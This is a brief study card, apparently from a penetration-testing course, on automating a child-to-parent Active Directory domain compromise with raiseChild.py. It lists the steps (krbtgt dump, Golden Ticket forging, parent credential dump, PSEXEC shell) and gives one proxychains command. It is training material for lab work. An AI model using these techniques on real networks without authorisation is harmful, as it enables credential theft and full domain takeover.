# 14.12 raiseChild.py Automated Compromise

> Automate the full child→parent compromise (krbtgt dump → SID injection → DCSync parent) with `raiseChild.py` over proxychains.

## Overview

The existing card is correct but shallow. The course shows the full command with credentials and proxychains. Expand accordingly.

## Steps

- Establish SSH dynamic port forward to child DC first
- Run raiseChild.py with child domain admin credentials; it auto-discovers krbtgt, forges Golden Ticket, dumps parent creds, and opens PSEXEC shell
- Specify -target-exe for the parent DC IP to get an interactive shell

## Commands

### raiseChild.py

```bash
proxychains raiseChild.py -target-exe 172.16.210.99 dev.<DOMAIN>.ad/<USER>
```
